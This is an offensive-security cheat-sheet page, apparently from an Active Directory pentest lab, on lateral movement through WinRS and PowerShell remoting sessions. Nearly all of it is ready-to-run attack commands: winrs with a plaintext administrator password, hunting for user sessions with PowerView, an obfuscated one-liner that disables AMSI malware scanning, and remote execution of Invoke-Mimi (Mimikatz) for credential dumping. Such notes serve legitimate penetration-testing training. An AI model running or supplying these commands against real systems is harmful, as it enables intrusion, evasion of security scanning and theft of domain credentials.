# Open other sessions

### **WINRS**

```powershell
winrs -remote:server1 -u:server1\administrator - p:Pass@1234 hostname
```

```powershell
winrs -r:$machine cmd
```

### **Other Sessions Opened**

```powerview
Find-DomainUserLocation
```

<figure><img src="../../../.gitbook/assets/Pasted image 20231018164427 (1).png" alt=""><figcaption></figcaption></figure>

Connect Using Win-rs

### **PS-SESSION**

[Forge a ticket](../../persistence/ticket-forging.md) and open the session

```powershell
$sess=New-PSSession dcorp-dc
```

Enter the session

```powershell
Enter-PSSession -Session $sess
```

## Execute PS1 in PS-Session

First open a PS-Session to the target machine

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString '<$password>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<$Domain\User>", $passwd)
$session = New-PSSession -ComputerName us-mailmgmt -Credential $creds
```
{% endcode %}

Enter the session and bypass the AMSI

```powershell
Enter-PSSession $session
```

{% code overflow="wrap" %}
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
{% endcode %}

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/immagine%20(2).png" alt=""><figcaption></figcaption></figure>

Now launch Invoke-Mimi throught the session

{% code overflow="wrap" %}
```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $session
```
{% endcode %}

Enter the session and launch the commands.
